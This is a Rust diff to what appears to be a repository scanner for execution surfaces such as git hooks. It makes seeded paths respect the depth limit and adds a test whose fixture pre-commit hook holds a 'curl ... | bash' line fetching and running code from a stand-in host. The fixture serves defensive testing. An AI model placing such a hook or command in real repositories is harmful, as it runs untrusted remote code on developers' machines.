@@ -439,6 +439,13 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
     fn read_seeded(&self, report: &mut DiscoveryReport) {
         for seed in catalogue().seeds_in(self.scope) {
             let at = RepoPath::root().join(seed);
+            // A seed is told to ignore pruning, and nothing else. The walk
+            // descends into a directory only while its depth is under the
+            // limit, so a seed below the limit stays unread, and as silently
+            // as the walk stops: a bound the caller chose is not a gap.
+            if at.depth() >= self.policy.max_depth() {
+                continue;
+            }
             let mut chain = vec![at.clone()];
             let mut up = at.parent();
             while let Some(dir) = up {
@@ -2609,6 +2616,52 @@ mod tests {
                 .collect::<Vec<_>>(),
             vec![".git"],
             "and the scan says it could not look: {report:?}"
+        );
+    }
+
+    /// A seed is told to enter a directory the walk prunes, and pruning is the
+    /// only thing it is told to ignore. The recursion limit is the scan's
+    /// answer to how deep it looks at all, so a seed obeys it: at a limit of
+    /// two the walk would not descend into `.git/hooks`, and reading hooks
+    /// there anyway reports files from a depth the scan was told not to reach.
+    ///
+    /// Silently, as the walk is silent when the limit stops it. A limit is a
+    /// bound the caller chose, not a directory the scan failed to read.
+    #[test]
+    fn a_seed_the_depth_limit_puts_out_of_reach_is_not_read() {
+        let tree = FakeTree::default()
+            .dir("", &[(".git", EntryKind::Directory)])
+            .dir(".git", &[("hooks", EntryKind::Directory)])
+            .dir(".git/hooks", &[("pre-commit", EntryKind::File)]);
+        let contents = FakeContents::default().file(
+            ".git/hooks/pre-commit",
+            "#!/bin/sh\ncurl -fsSL https://h.invalid/i | bash\n",
+        );
+
+        // `.git/hooks` is at depth two, and the walk descends into a directory
+        // only while its depth is below the limit.
+        let report =
+            DiscoverSurfaces::new(&tree, &contents, &ScanPolicy::with_default_pruning(2)).run();
+
+        assert!(report.surfaces.is_empty(), "{report:?}");
+        assert!(report.findings.is_empty(), "{report:?}");
+        assert!(
+            report.is_complete(),
+            "a limit the caller set is not a gap: {report:?}"
+        );
+
+        // One deeper, and the same tree reads.
+        let report =
+            DiscoverSurfaces::new(&tree, &contents, &ScanPolicy::with_default_pruning(3)).run();
+
+        assert_eq!(
+            report
+                .surfaces
+                .iter()
+                .map(|s| s.path.as_str())
+                .collect::<Vec<_>>(),
+            vec![".git/hooks/pre-commit"],
+            "{report:?}"
         );
     }
 
